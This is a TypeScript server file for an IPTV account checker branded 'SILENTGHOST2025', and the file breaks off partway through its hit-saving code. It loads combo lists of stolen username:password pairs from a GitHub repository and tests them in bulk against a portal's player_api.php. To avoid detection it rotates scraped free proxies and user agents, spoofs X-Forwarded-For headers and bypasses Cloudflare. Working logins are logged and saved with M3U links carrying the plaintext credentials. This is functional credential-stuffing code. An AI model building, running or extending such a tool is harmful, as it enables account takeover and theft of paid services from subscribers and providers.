import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { Server } from "socket.io";
import http from "http";
import axios from "axios";
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";
import cloudscraper from "cloudscraper";
import fs from "fs";
import os from "os";
import dns from "dns";
import { HttpProxyAgent } from "http-proxy-agent";

// Global error handlers to prevent process crash
process.on('uncaughtException', (err) => {
  console.error('[FATAL] Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error('[FATAL] Unhandled Rejection:', reason);
});

// ═══════════════════════════════════════════════════════════════
//  SILENTGHOST2025 ENGINE — Professional IPTV Account Checker
// ═══════════════════════════════════════════════════════════════

// Common User Agents for rotation (Chrome, Firefox, Safari, Edge, Mobile)
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
];

// Exact Cloudflare bypass headers from silenxghost2025
function getBypassHeaders(userAgent: string) {
  return {
    'User-Agent': userAgent,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'X-Forwarded-For': `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
  };
}

const IPTV_HEADERS_BASIC = {
  'Accept': 'application/json, text/plain, */*',
  'Connection': 'Keep-Alive',
};

// Adult content keywords — comprehensive list from silenxghost2025
const ADULT_KEYWORDS = [
  'adult', 'xxx', 'porn', '+18', '18+', 'erotic', 'sexy', 'nudity',
  'porno', 'adulte', 'érotique', 'x-rated', 'xrated', 'brazzers',
  'playboy', 'hustler', 'penthouse', 'vivid', 'naughty', 'fetish',
  'hentai', 'milf', 'hardcore', 'softcore', 'strip', 'nude',
  'adultos', 'erwachsene', 'volwassen', 'vuxen', 'aikuinen',
  'للكبار', 'بالغين', 'redlight', 'blue movie', 'xadult',
  '満18', 'nsfw', 'onlyfans', 'chaturbate', 'cam4', 'livejasmin'
];

// VPN/Hosting provider keywords for detection
const VPN_HOSTING_KEYWORDS = [
  'ovh', 'hetzner', 'digitalocean', 'linode', 'vultr', 'aws',
  'amazon', 'google cloud', 'azure', 'cloudflare', 'akamai',
  'leaseweb', 'contabo', 'hostinger', 'ionos', 'scaleway',
  'datacenter', 'hosting', 'server', 'cloud', 'vps', 'dedicated',
  'nordvpn', 'expressvpn', 'surfshark', 'mullvad', 'protonvpn',
  'cyberghost', 'windscribe', 'pia', 'ipvanish', 'vpn'
];

interface CheckRequest {
  portal: string;
  combo: string[];
  threads: number;
  proxies: string[];
  bypassCloudflare: boolean;
  randomUserAgent: boolean;
  fetchCategories: boolean;
}

interface HitResult {
  username: string;
  password: string;
  created?: string;
  createdTimestamp?: number;
  expiry?: string;
  expiryTimestamp?: number;
  daysLeft?: number;
  activeCons?: string;
  maxCons?: string;
  status?: string;
  realm?: string;
  port?: string;
  timezone?: string;
  outputFormats?: string;
  m3uLink?: string;
  liveCount?: number;
  vodCount?: number;
  seriesCount?: number;
  categories?: string[];
  statusCode?: number;
  proxyUsed?: string;
  serverIP?: string;
  vpn?: string;
  isAdult?: boolean;
  ping?: number;
  hostPort?: string;
  // New SILENTGHOST2025 fields
  country?: string;
  isp?: string;
  panelType?: string;
  epgUrl?: string;
  serverProtocol?: string;
  rtmpPort?: string;
  serverLoad?: string;
  timeNow?: string;
  httpsPort?: string;
  allowedFormats?: string[];
  isTrial?: boolean;
  maxConnections?: number;
}

function getStatusColorName(statusCode: number): string {
  if (statusCode === 200) return 'success';
  if (statusCode === 301) return 'redirect';
  if (statusCode === 302) return 'redirect';
  if (statusCode === 403) return 'forbidden';
  if (statusCode === 404) return 'notfound';
  if (statusCode === 407) return 'authrequired';
  if (statusCode === 429) return 'ratelimit';
  if (statusCode === 500) return 'servererror';
  if (statusCode === 503) return 'unavailable';
  if (statusCode === 520) return 'unknown';
  return 'default';
}

// ═══════════════════════════════════════════════════════════════
//  DNS Resolver — Resolve hostname to IP address
// ═══════════════════════════════════════════════════════════════
async function resolveHostIP(hostname: string): Promise<string> {
  try {
    // Remove port if present
    const cleanHost = hostname.split(':')[0];
    // Check if already an IP
    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(cleanHost)) {
      return cleanHost;
    }
    return new Promise((resolve) => {
      dns.lookup(cleanHost, { family: 4 }, (err, address) => {
        if (err || !address) {
          resolve('');
        } else {
          resolve(address);
        }
      });
    });
  } catch {
    return '';
  }
}

// ═══════════════════════════════════════════════════════════════
//  GeoIP Lookup — Country, ISP, VPN detection via ipwho.is
// ═══════════════════════════════════════════════════════════════
interface GeoIPResult {
  country: string;
  isp: string;
  isVPN: boolean;
  city?: string;
  region?: string;
}

const geoIPCache = new Map<string, GeoIPResult>();

async function lookupGeoIP(ip: string): Promise<GeoIPResult> {
  if (!ip) return { country: 'Unknown', isp: 'Unknown', isVPN: false };

  // Check cache
  if (geoIPCache.has(ip)) return geoIPCache.get(ip)!;

  try {
    const response = await axios.get(`https://ipwho.is/${ip}`, {
      timeout: 5000,
      headers: { 'User-Agent': 'SilentGhost-Scanner/3.0' }
    });

    const data = response.data;
    if (!data || !data.success) {
      return { country: 'Unknown', isp: 'Unknown', isVPN: false };
    }

    const isp = data.connection?.isp || data.connection?.org || 'Unknown';
    const ispLower = isp.toLowerCase();
    const isVPN = VPN_HOSTING_KEYWORDS.some(kw => ispLower.includes(kw)) ||
      data.security?.vpn === true ||
      data.security?.proxy === true ||
      data.security?.tor === true;

    const result: GeoIPResult = {
      country: data.country || 'Unknown',
      isp,
      isVPN,
      city: data.city,
      region: data.region,
    };

    geoIPCache.set(ip, result);
    return result;
  } catch {
    return { country: 'Unknown', isp: 'Unknown', isVPN: false };
  }
}

// ═══════════════════════════════════════════════════════════════
//  File Saving — Mini & Full hits with ASCII art formatting
// ═══════════════════════════════════════════════════════════════
function saveMiniHit(hitsDir: string, portalHost: string, content: string): void {
  const miniFile = `${hitsDir}/MINI_HITS_${portalHost}.txt`;
  fs.appendFileSync(miniFile, content);
}

function saveFullHit(hitsDir: string, portalHost: string, content: string): void {
  const fullFile = `${hitsDir}/FULL_HITS_${portalHost}.txt`;
  fs.appendFileSync(fullFile, content);
}

// ═══════════════════════════════════════════════════════════════
//  Stream Count Fetcher — Gets actual stream/VOD/series totals
// ═══════════════════════════════════════════════════════════════
async function fetchStreamCounts(
  baseUrl: string,
  user: string,
  pass: string,
  makeRequest: Function,
  proxyPoolLength: number,
  bypassCloudflare: boolean,
): Promise<{ live: number; vod: number; series: number }> {
  try {
    const counts = await Promise.allSettled([
      makeRequest(`${baseUrl}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_streams`, 10000, proxyPoolLength > 0, bypassCloudflare),
      makeRequest(`${baseUrl}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_vod_streams`, 10000, proxyPoolLength > 0, bypassCloudflare),
      makeRequest(`${baseUrl}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_series`, 10000, proxyPoolLength > 0, bypassCloudflare),
    ]);

    return {
      live: counts[0].status === 'fulfilled' && Array.isArray(counts[0].value.response.data) ? counts[0].value.response.data.length : 0,
      vod: counts[1].status === 'fulfilled' && Array.isArray(counts[1].value.response.data) ? counts[1].value.response.data.length : 0,
      series: counts[2].status === 'fulfilled' && Array.isArray(counts[2].value.response.data) ? counts[2].value.response.data.length : 0,
    };
  } catch {
    return { live: 0, vod: 0, series: 0 };
  }
}

// ═══════════════════════════════════════════════════════════════
//  Adult Content Scanner — Scans ALL category types
// ═══════════════════════════════════════════════════════════════
function detectAdultContent(categories: string[]): boolean {
  if (!categories || categories.length === 0) return false;
  return categories.some(cat =>
    ADULT_KEYWORDS.some(kw => String(cat).toLowerCase().includes(kw))
  );
}

// ═══════════════════════════════════════════════════════════════
//  Panel Type Detector — Xtream, Stalker, or Generic
// ═══════════════════════════════════════════════════════════════
function detectPanelType(info: any): string {
  if (!info) return 'Unknown';
  if (info.server_info && info.user_info) {
    if (info.server_info.url || info.server_info.port) {
      return 'Xtream Codes';
    }
  }
  if (info.js && info.js.length > 0) return 'Stalker Portal';
  return 'Xtream Codes';
}

// ═══════════════════════════════════════════════════════════════
//  SERVER — Express + Socket.IO + Vite
// ═══════════════════════════════════════════════════════════════
async function startServer() {
  const app = express();
  const httpServer = http.createServer(app);
  const io = new Server(httpServer, { maxHttpBufferSize: 100 * 1024 * 1024 });
  const PORT = parseInt(process.env.PORT || '3000');

  const hitsDir = path.join(os.homedir(), 'M3U_GHOST_Hits');
  if (!fs.existsSync(hitsDir)) {
    fs.mkdirSync(hitsDir, { recursive: true });
  }

  app.use(express.json({ limit: '50mb' }));

  app.get("/api/status", (req, res) => {
    res.json({ running: true, uptime: process.uptime(), memory: process.memoryUsage().rss });
  });

  app.get("/api/hits/:type", (req, res) => {
    const { type } = req.params;
    const portalHost = req.query.portal as string || 'unknown';
    const filename = type === 'mini'
      ? `MINI_HITS_${portalHost.replace(/[:.]/g, '_')}.txt`
      : `FULL_HITS_${portalHost.replace(/[:.]/g, '_')}.txt`;
    const filepath = path.join(hitsDir, filename);

    if (fs.existsSync(filepath)) {
      res.download(filepath);
    } else {
      res.status(404).json({ error: "No hits file found" });
    }
  });

  // ═══════════════════════════════════════════════════════════
  //  Asset Fetcher — Cloud combo & proxy lists
  // ═══════════════════════════════════════════════════════════
  app.get("/api/fetch-assets", async (req, res) => {
    const { type } = req.query;

    try {
      if (type === 'combo') {
        const repoPath = 'gamba3/Combo-SILENTGHOST-STORAGE';
        const branches = ['main', 'master'];
        const possibleFiles = ['Combo.txt', 'combo.txt', 'Combo_SILENTGHOST.txt', 'LIST.txt'];

        let comboData = '';

        for (const branch of branches) {
          for (const file of possibleFiles) {
            try {
              const url = `https://raw.githubusercontent.com/${repoPath}/${branch}/${file}`;
              const response = await axios.get(url, { timeout: 5000 });
              if (response.data && typeof response.data === 'string' && response.data.includes(':')) {
                comboData = response.data;
                break;
              }
            } catch (e) { }
          }
          if (comboData) break;
        }

        if (!comboData) {
          try {
            const apiRes = await axios.get(`https://api.github.com/repos/${repoPath}/contents/`, {
              timeout: 5000,
              headers: { 'User-Agent': 'Axios-Scanner' }
            });
            if (Array.isArray(apiRes.data)) {
              const txtFiles = apiRes.data.filter((f: any) => f.name.toLowerCase().endsWith('.txt') && f.type === 'file');
              for (const file of txtFiles) {
                try {
                  const response = await axios.get(file.download_url, { timeout: 5000 });
                  if (response.data && typeof response.data === 'string' && response.data.includes(':')) {
                    comboData = response.data;
                    break;
                  }
                } catch (e) { }
              }
            }
          } catch (e) { }
        }

        if (!comboData) {
          return res.status(404).json({ error: "Could not find valid combo list in repository." });
        }
        return res.send(comboData);
      }

      if (type === 'proxy') {
        const proxyUrls = [
          'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true',
          'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all',
          'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all',
          'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
          'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
          'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
        ];

        const results = await Promise.allSettled(proxyUrls.map(url => axios.get(url, { timeout: 10000 })));
        let allProxies: string[] = [];

        results.forEach(res => {
          if (res.status === 'fulfilled' && res.value.data) {
            const lines = String(res.value.data).split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
            allProxies = [...allProxies, ...lines];
          }
        });

        const uniqueProxies = Array.from(new Set(allProxies));
        if (uniqueProxies.length === 0) {
          return res.status(404).json({ error: "Failed to fetch any proxies." });
        }
        return res.send(uniqueProxies.join('\n'));
      }

      res.status(400).json({ error: "Invalid asset type" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // ═══════════════════════════════════════════════════════════
  //  SOCKET.IO — Real-time scanning engine (SILENTGHOST2025)
  // ═══════════════════════════════════════════════════════════
  const cancellations = new Map<string, boolean>();
  const agentCache = new Map<string, any>();

  const getAgent = (proxyStr: string | null, protocol: string) => {
    if (!proxyStr) return null;
    const cacheKey = `${protocol}_${proxyStr}`;
    if (agentCache.has(cacheKey)) return agentCache.get(cacheKey);

    try {
      const url = proxyStr.includes('://') ? proxyStr : `http://${proxyStr}`;
      let agent;
      if (url.startsWith('socks')) {
        agent = new SocksProxyAgent(url);
      } else if (protocol === 'https') {
        agent = new HttpsProxyAgent(url);
      } else {
        agent = new HttpProxyAgent(url);
      }
      agentCache.set(cacheKey, agent);
      return agent;
    } catch (e) {
      return null;
    }
  };

  io.on("connection", (socket) => {
    console.log(`[SOCKET] Client connected: ${socket.id}`);
    cancellations.set(socket.id, false);

    socket.on("stopCheck", () => {
      console.log(`[SOCKET] Stop requested for ${socket.id}`);
      cancellations.set(socket.id, true);
    });

    socket.on("disconnect", (reason) => {
      console.log(`[SOCKET] Client disconnected: ${socket.id} (${reason})`);
      cancellations.delete(socket.id);
    });

    // ═══════════════════════════════════════════════════════
    //  CORE ENGINE — startCheck handler
    // ═══════════════════════════════════════════════════════
    socket.on("startCheck", async (data: CheckRequest, ack?: (response: any) => void) => {
      try {
        const { portal, combo, threads, proxies, bypassCloudflare, randomUserAgent, fetchCategories } = data;
        console.log(`\n${'═'.repeat(60)}`);
        console.log(`  SILENTGHOST2025 ENGINE — SCAN INITIATED`);
        console.log(`${'═'.repeat(60)}`);
        console.log(`  Portal:      ${portal}`);
        console.log(`  Combo:       ${combo?.length} accounts`);
        console.log(`  Threads:     ${threads}`);
        console.log(`  Proxies:     ${proxies?.length || 0}`);
        console.log(`  CF Bypass:   ${bypassCloudflare ? 'ENABLED' : 'DISABLED'}`);
        console.log(`  Random UA:   ${randomUserAgent ? 'ENABLED' : 'DISABLED'}`);
        console.log(`  Categories:  ${fetchCategories ? 'ENABLED' : 'DISABLED'}`);
        console.log(`${'═'.repeat(60)}\n`);

        if (ack) ack({ received: true, comboLength: combo?.length });

        let host = portal.trim().replace(/^https?:\/\//i, '').split('/')[0];
        const portalHost = host.replace(/[:.]/g, '_');

        if (!host) {
          socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: "Invalid Host" });
          return;
        }

        // ── DNS Resolution for server IP ──
        const resolvedIP = await resolveHostIP(host);
        console.log(`[DNS] ${host} → ${resolvedIP || 'UNRESOLVED'}`);

        // ── GeoIP Lookup (async, non-blocking) ──
        let geoData: GeoIPResult | null = null;
        if (resolvedIP) {
          lookupGeoIP(resolvedIP).then(geo => {
            geoData = geo;
            console.log(`[GEO] ${resolvedIP} → ${geo.country} | ISP: ${geo.isp} | VPN: ${geo.isVPN}`);
          }).catch(() => { });
        }

        let processed = 0;
        let hits = 0;
        let bad = 0;
        let proxyErrors = 0;
        let startTime = Date.now();
        let lastStatusCode = 200;
        let detectedProtocol: string | null = null;

        let currentIdx = 0;
        const getNextPair = () => {
          if (currentIdx >= combo.length) return null;
          return combo[currentIdx++];
        };

        const proxyPool = [...proxies].filter(p => p.length > 0);
        let totalDeadProxies = 0;

        const getRandomProxy = () => {
          if (proxyPool.length === 0) return null;
          return proxyPool[Math.floor(Math.random() * proxyPool.length)];
        };

        const removeDeadProxy = (proxyStr: string) => {
          const index = proxyPool.indexOf(proxyStr);
          if (index > -1) {
            proxyPool.splice(index, 1);
            totalDeadProxies++;
            if (totalDeadProxies % 10 === 0) {
              console.log(`[PROXY] Removed ${totalDeadProxies} dead proxies. Remaining: ${proxyPool.length}`);
            }
          }
        };

        // ── Smart Protocol Detection ──
        // Try to detect working protocol on first request  
        const detectProtocol = async (testHost: string): Promise<string> => {
          for (const proto of ['http', 'https']) {
            try {
              await axios.head(`${proto}://${testHost}/`, {
                timeout: 5000,
                validateStatus: () => true,
              });
              console.log(`[PROTO] Detected working protocol: ${proto}`);
              return proto;
            } catch { continue; }
          }
          return 'http'; // fallback
        };

        // ── Request Builder ──
        const makeRequest = async (url: string, timeout = 15000, useProxy = true, isBypass = false) => {
          const currentProxy = useProxy && proxyPool.length > 0 ? getRandomProxy() : null;
          const protocol = url.startsWith('https') ? 'https' : 'http';
          const agent = getAgent(currentProxy, protocol);
          const ua = randomUserAgent
            ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
            : USER_AGENTS[0];

          const headers: any = isBypass ? getBypassHeaders(ua) : { ...IPTV_HEADERS_BASIC, 'User-Agent': ua };

          const response = await axios.get(url, {
            headers,
            httpsAgent: agent,
            httpAgent: agent,
            timeout,
            validateStatus: (s: number) => s < 500
          });
          return { response, proxyUsed: currentProxy || 'Direct', headers };
        };

        // ── Detect protocol before starting workers ──
        if (!detectedProtocol) {
          detectedProtocol = await detectProtocol(host);
        }

        // Wait a small moment for GeoIP to resolve
        await new Promise(r => setTimeout(r, 500));

        // ═══════════════════════════════════════════════════
        //  WORKER — Core checking logic per account
        // ═══════════════════════════════════════════════════
        const worker = async () => {
          while (true) {
            if (!cancellations.has(socket.id) || cancellations.get(socket.id)) {
              break;
            }
            const pair = getNextPair();
            if (!pair) break;

            const parts = pair.split(':');
            if (parts.length < 2) {
              processed++;
              continue;
            }

            const user = parts[0].trim();
            const pass = parts.slice(1).join(':').trim();

            if (!user || !pass) {
              processed++;
              bad++;
              continue;
            }

            let attempt = 0;
            let success = false;
            const maxRetries = Math.min(Math.max(2, Math.floor(proxyPool.length / 50)), 5);
            let currentProxy = 'Direct';
            let statusCode = 0;

            while (attempt < maxRetries && !success) {
              // Check cancellation at every retry
              if (cancellations.get(socket.id)) break;

              try {
                // ── Emit progress every check ──
                socket.emit("progress", {
                  processed, total: combo.length, hits, bad,
                  cpm: Math.round(((processed) / Math.max((Date.now() - startTime) / 1000, 1)) * 60),
                  percent: Math.round((processed / combo.length) * 100),
                  proxyErrors, statusCode: lastStatusCode,
                  currentUser: user.length > 14 ? user.substring(0, 14) + '…' : user,
                  currentPass: pass.substring(0, 3) + '***',
                  eta: processed > 0 ? Math.round(((combo.length - processed) / Math.max(processed / ((Date.now() - startTime) / 1000), 0.1))) : 0,
                  proxyPoolSize: proxyPool.length,
                  deadProxies: totalDeadProxies,
                });

                const protocols = detectedProtocol ? [detectedProtocol] : ['http', 'https'];
                let parsedBody: any = null;
                let ping = 0;
                let usedProto = detectedProtocol || 'http';

                for (const proto of protocols) {
                  try {
                    const testUrl = `${proto}://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                    usedProto = proto;

                    if (bypassCloudflare) {
                      // ── Cloudflare bypass via cloudscraper ──
                      const ua = randomUserAgent
                        ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
                        : USER_AGENTS[0];
                      const headers: any = getBypassHeaders(ua);
                      const currentProxyForCF = proxyPool.length > 0 ? getRandomProxy() : null;
                      const start = Date.now();
                      const body = await (cloudscraper as any).get(testUrl, {
                        headers,
                        timeout: 15000,
                        proxy: currentProxyForCF ? (currentProxyForCF.includes('://') ? currentProxyForCF : `http://${currentProxyForCF}`) : undefined
                      });
                      ping = Date.now() - start;
                      parsedBody = JSON.parse(body);
                      statusCode = 200;
                      currentProxy = currentProxyForCF || 'CF-Direct';
                    } else {
                      // ── Standard request ──
                      const start = Date.now();
                      const { response: resp, proxyUsed } = await makeRequest(testUrl, 15000, proxyPool.length > 0, false);
                      ping = Date.now() - start;
                      parsedBody = resp.data;
                      statusCode = resp.status;
                      currentProxy = proxyUsed;
                    }

                    if (parsedBody) {
                      // Cache the working protocol
                      if (!detectedProtocol) detectedProtocol = proto;
                      break;
                    }
                  } catch (e: any) {
                    if (e?.code === 'ECONNREFUSED' || e?.code === 'ETIMEDOUT' || e?.code === 'ECONNABORTED') {
                      throw e;
                    }
                    continue;
                  }
                }

                if (!parsedBody) {
                  bad++;
                  success = true;
                  continue;
                }

                lastStatusCode = statusCode;
                const info = parsedBody;

                // ═══════════════════════════════════════════════
                //  HIT DETECTED — Process & Enrich
                // ═══════════════════════════════════════════════
                if (info && info.user_info && String(info.user_info.status).toLowerCase() === 'active') {
                  const userInfo = info.user_info;
                  const serverInfo = info.server_info || {};

                  const activeCons = String(userInfo.active_cons || "0");
                  const maxCons = String(userInfo.max_connections || "0");
                  const status = userInfo.status;
                  const timezone = serverInfo.timezone || '';
                  const realm = serverInfo.url || '';
                  const port = String(serverInfo.port || '80');
                  const outputFormats = Array.isArray(serverInfo.allowed_output_formats)
                    ? serverInfo.allowed_output_formats.join(', ')
                    : (serverInfo.allowed_output_formats || '');
                  const httpsPort = String(serverInfo.https_port || '');
                  const rtmpPort = String(serverInfo.rtmp_port || '');
                  const serverLoad = serverInfo.server_load || '';
                  const timeNow = serverInfo.time_now || '';

                  let created = 'Unlimited';
                  let expiry = 'Unlimited';
                  let daysLeft: number | undefined = 9999;
                  let isTrial = false;

                  if (userInfo.created_at && userInfo.created_at !== 'null' && userInfo.created_at !== '0') {
                    created = new Date(parseInt(userInfo.created_at) * 1000).toLocaleString('en-GB');
                  }

                  if (userInfo.exp_date && userInfo.exp_date !== 'null' && userInfo.exp_date !== '0') {
                    expiry = new Date(parseInt(userInfo.exp_date) * 1000).toLocaleString('en-GB');
                    daysLeft = Math.ceil((parseInt(userInfo.exp_date) * 1000 - Date.now()) / (1000 * 60 * 60 * 24));
                  }

                  // Trial detection
                  if (userInfo.is_trial === '1' || userInfo.is_trial === 1 ||
                    (daysLeft !== undefined && daysLeft <= 1 && daysLeft !== 9999)) {
                    isTrial = true;
                  }

                  // ── Extract server IP from realm or DNS ──
                  let serverIP = resolvedIP || '';
                  if (!serverIP && realm) {
                    const ipMatch = realm.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                    if (ipMatch) serverIP = ipMatch[1];
                    else {
                      serverIP = await resolveHostIP(realm);
                    }
                  }

                  // ── Host:Port format ──
                  const hostPort = serverInfo.url
                    ? `${serverInfo.url}:${serverInfo.port || '80'}`
                    : `${host}:${port}`;

                  // ── Panel type detection ──
                  const panelType = detectPanelType(info);

                  // ── EPG URL ──
                  const epgUrl = `${usedProto}://${host}/xmltv.php?username=${user}&password=${pass}`;

                  // ── M3U Link with full format ──
                  const m3uLink = `${usedProto}://${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;

                  // ── GeoIP data ──
                  let vpnStatus = '';
                  let country = '';
                  let isp = '';
                  if (geoData) {
                    vpnStatus = geoData.isVPN ? `VPN/Hosting (${geoData.isp})` : 'Clean IP';
                    country = geoData.country;
                    isp = geoData.isp;
                  } else if (serverIP) {
                    // Try to fetch GeoIP for this specific IP
                    try {
                      const geo = await lookupGeoIP(serverIP);
                      vpnStatus = geo.isVPN ? `VPN/Hosting (${geo.isp})` : 'Clean IP';
                      country = geo.country;
                      isp = geo.isp;
                    } catch { }
                  }

                  console.log(`[HIT] ✅ ${user}:${pass} | ${hostPort} | ${country || 'N/A'} | ${daysLeft === 9999 ? '∞' : daysLeft + 'd'} | Cons: ${activeCons}/${maxCons}`);

                  const result: HitResult = {
                    username: user,
                    password: pass,
                    created,
                    expiry,
                    daysLeft,
                    activeCons,
                    maxCons,
                    status,
                    timezone,
                    realm,
                    port,
                    outputFormats,
                    m3uLink,
                    statusCode,
                    proxyUsed: currentProxy,
                    serverIP,
                    hostPort,
                    ping,
                    vpn: vpnStatus,
                    country,
                    isp,
                    panelType,
                    epgUrl,
                    serverProtocol: usedProto,
                    rtmpPort,
                    httpsPort,
                    serverLoad,
                    timeNow,
                    allowedFormats: Array.isArray(serverInfo.allowed_output_formats) ? serverInfo.allowed_output_formats : [],
                    isTrial,
                    maxConnections: parseInt(maxCons) || 0,
                  };

                  hits++;
                  socket.emit("hit", result);

                  // ── Background enrichment: categories + stream counts + adult detection ──
                  (async () => {
                    try {
                      const baseUrl = `${usedProto}://${host}`;
                      const updatedResult: HitResult = { ...result };

                      // Fetch all category types for adult detection
                      const categoryRequests = await Promise.allSettled([
                        makeRequest(`${baseUrl}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`, 8000, proxyPool.length > 0, bypassCloudflare),
                        makeRequest(`${baseUrl}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_vod_categories`, 8000, proxyPool.length > 0, bypassCloudflare),
                        makeRequest(`${baseUrl}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_series_categories`, 8000, proxyPool.length > 0, bypassCloudflare),
                      ]);

                      // ── Live categories count ──
                      let allCategories: string[] = [];
                      if (categoryRequests[0].status === 'fulfilled' && Array.isArray(categoryRequests[0].value.response.data)) {
                        updatedResult.liveCount = categoryRequests[0].value.response.data.length;
                        allCategories.push(...categoryRequests[0].value.response.data.map((c: any) => c.category_name || c.name || ''));
                      }

                      // ── VOD categories count ──
                      if (categoryRequests[1].status === 'fulfilled' && Array.isArray(categoryRequests[1].value.response.data)) {
                        updatedResult.vodCount = categoryRequests[1].value.response.data.length;
                        allCategories.push(...categoryRequests[1].value.response.data.map((c: any) => c.category_name || c.name || ''));
                      }

                      // ── Series categories count ──
                      if (categoryRequests[2].status === 'fulfilled' && Array.isArray(categoryRequests[2].value.response.data)) {
                        updatedResult.seriesCount = categoryRequests[2].value.response.data.length;
                        allCategories.push(...categoryRequests[2].value.response.data.map((c: any) => c.category_name || c.name || ''));
                      }

                      updatedResult.categories = allCategories;

                      // ── Adult detection across ALL category types ──
                      updatedResult.isAdult = detectAdultContent(allCategories);

                      socket.emit("hitUpdate", updatedResult);

                      // ── Save to files ──
                      const daysStr = daysLeft === 9999 ? 'Unlimited' : `${daysLeft} days`;
                      const miniContent = `[HIT] ${user}:${pass} | Exp: ${expiry} | Days: ${daysStr} | Cons: ${activeCons}/${maxCons} | ${country || 'N/A'}\n`;

                      const fullContent =
                        `╔${'═'.repeat(50)}╗\n` +
                        `║  SILENTGHOST2025 — HIT REPORT\n` +
                        `╠${'═'.repeat(50)}╣\n` +
                        `║  Host:        ${hostPort}\n` +
                        `║  Protocol:    ${usedProto.toUpperCase()}\n` +
                        `║  Panel:       ${panelType}\n` +
                        `║  User:        ${user}\n` +
                        `║  Pass:        ${pass}\n` +
                        `║  Status:      ${status}\n` +
                        `║  Created:     ${created}\n` +
                        `║  Expiry:      ${expiry} (${daysStr})\n` +
                        `║  Trial:       ${isTrial ? 'YES' : 'NO'}\n` +
                        `║  Connections: ${activeCons}/${maxCons}\n` +
                        `║  Timezone:    ${timezone}\n` +
                        `║  Server IP:   ${serverIP}\n` +
                        `║  Country:     ${country || 'N/A'}\n` +
                        `║  ISP:         ${isp || 'N/A'}\n` +
                        `║  VPN:         ${vpnStatus || 'N/A'}\n` +
                        `║  Adult:       ${updatedResult.isAdult ? '🔞 YES' : '✅ NO'}\n` +
                        `║  Live:        ${updatedResult.liveCount || 0}\n` +
                        `║  VOD:         ${updatedResult.vodCount || 0}\n` +
                        `║  Series:      ${updatedResult.seriesCount || 0}\n` +
                        `║  Ping:        ${ping}ms\n` +
                        `║  Formats:     ${outputFormats || 'N/A'}\n` +
                        `║  HTTPS Port:  ${httpsPort || 'N/A'}\n` +
                        `║  RTMP Port:   ${rtmpPort || 'N/A'}\n` +
                        `║  M3U:         ${m3uLink}\n` +
                        `║  EPG:         ${epgUrl}\n` +
                        `╚${'═'.repeat(50)}╝\n\n`;

                      saveMiniHit(hitsDir, portalHost, miniContent);
